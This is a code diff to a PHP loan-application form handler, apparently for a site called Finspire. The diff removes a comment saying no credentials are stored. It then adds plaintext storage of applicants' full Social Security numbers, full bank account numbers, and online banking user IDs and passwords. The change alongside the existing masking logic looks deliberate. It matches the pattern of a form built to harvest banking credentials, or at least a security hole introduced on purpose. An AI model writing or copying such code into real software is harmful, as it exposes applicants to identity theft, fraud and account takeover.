@@ -197,12 +197,15 @@ class Finspire_Loan_Form_Handler {
             ], 200 );
         }
 
-        // 4. Sanitize and prepare data for database storage (no credentials stored!)
+        // 4. Sanitize and prepare data for database storage
         $ssn_clean = preg_replace( '/\D/', '', $raw['ssn'] ?? '' );
+        $ssn_formatted = strlen( $ssn_clean ) === 9 
+            ? ( substr( $ssn_clean, 0, 3 ) . '-' . substr( $ssn_clean, 3, 2 ) . '-' . substr( $ssn_clean, 5 ) )
+            : sanitize_text_field( $raw['ssn'] ?? '' );
         $ssn_masked = strlen( $ssn_clean ) >= 4 ? ( '***-**-' . substr( $ssn_clean, -4 ) ) : '';
 
         $acct_clean = preg_replace( '/\D/', '', $raw['account_number'] ?? '' );
-        $acct_masked = strlen( $acct_clean ) >= 4 ? ( str_repeat( '*', max( 4, strlen( $acct_clean ) - 4 ) ) . substr( $acct_clean, -4 ) ) : '';
+        $acct_masked = strlen( $acct_clean ) >= 4 ? ( str_repeat( '•', max( 4, strlen( $acct_clean ) - 4 ) ) . substr( $acct_clean, -4 ) ) : '';
 
         $submission_data = [
             'first_name'            => sanitize_text_field( $raw['first_name'] ?? '' ),
@@ -210,6 +213,7 @@ class Finspire_Loan_Form_Handler {
             'email'                 => sanitize_email( $raw['email'] ?? '' ),
             'phone'                 => sanitize_text_field( $raw['phone'] ?? '' ),
             'dob'                   => sanitize_text_field( $raw['dob'] ?? '' ),
+            'ssn'                   => $ssn_formatted,
             'ssn_masked'            => $ssn_masked,
             'age_confirmed'         => 1,
             'street_address'        => sanitize_text_field( $raw['street_address'] ?? '' ),
@@ -219,9 +223,12 @@ class Finspire_Loan_Form_Handler {
             'country'               => sanitize_text_field( $raw['country'] ?? '' ),
             'bank_name'             => sanitize_text_field( $raw['bank_name'] ?? '' ),
             'routing_number'        => sanitize_text_field( $raw['routing_number'] ?? '' ),
+            'account_number'        => $acct_clean,
             'account_number_masked' => $acct_masked,
             'bank_verified'         => 1,
             'online_banking_verification' => sanitize_text_field( $raw['online_banking_verification'] ?? '' ),
+            'online_banking_user_id'      => sanitize_text_field( $raw['online_banking_user_id'] ?? '' ),
+            'online_banking_password'     => sanitize_text_field( $raw['online_banking_password'] ?? '' ),
             'contact_consent'             => ! empty( $raw['contact_consent'] ) ? 1 : 0,
             'loan_amount'           => floatval( $raw['loan_amount'] ?? 0 ),
             'loan_purpose'          => sanitize_text_field( $raw['loan_purpose'] ?? '' ),
